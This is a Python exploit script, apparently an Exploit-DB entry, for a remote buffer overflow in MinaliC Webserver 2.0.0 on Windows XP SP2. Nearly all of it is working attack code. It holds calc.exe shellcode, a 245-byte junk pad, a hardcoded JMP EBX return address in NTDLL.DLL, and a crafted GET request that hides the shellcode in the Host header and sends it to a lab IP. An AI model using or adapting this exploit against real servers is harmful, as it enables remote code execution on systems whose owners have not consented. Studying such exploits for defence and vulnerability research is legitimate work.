#!/usr/bin/env python

# Exploit Title: MinaliC Webserver buffer overflow
# Date: 12 Apr 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://minalic.sourceforge.net/
# Version: MinaliC Webserver 2.0.0
# Tested on: Windows XP Pro SP2, English
#
# Description: 
# Remote command execution by triggering a buffer overflow in the GET
# request. 
#

import socket
import struct

# 74 bytes calc.exe from http://code.google.com/p/win-exec-calc-shellcode/
shellcode = (
"\x31\xd2\x52\x68\x63\x61\x6c\x63\x89\xe6\x52\x56\x64\x8b\x72" +
"\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f" +
"\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x4c\x1f\x24" +
"\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c\x07\x57\x69\x6e\x45" +
"\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\xcc"
)

# EIP at offset 245 when minalic.exe is in C:\minalic\bin 
# EBX points directly to the "Host:" value, so we put our shellcode there. 
# JMP EBX @ 0x7C955B47, NTDLL.DLL, Windows XP Pro SP2 English

# Exploit-DB Note:
# ret = struct.pack("<I", 0x77c11f13)     # jmp ebx msvcrt.dll Windows XP SP3 English

junk = "\x41" * 245
ret = struct.pack("<I", 0x7C955B47)
host = "\x90" * 30 + shellcode + "\x90" * 31

buf = "GET /" + junk + ret + " HTTP/1.1\r\n" + "Host: " + host + "\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.37.132", 8080))
s.send(buf)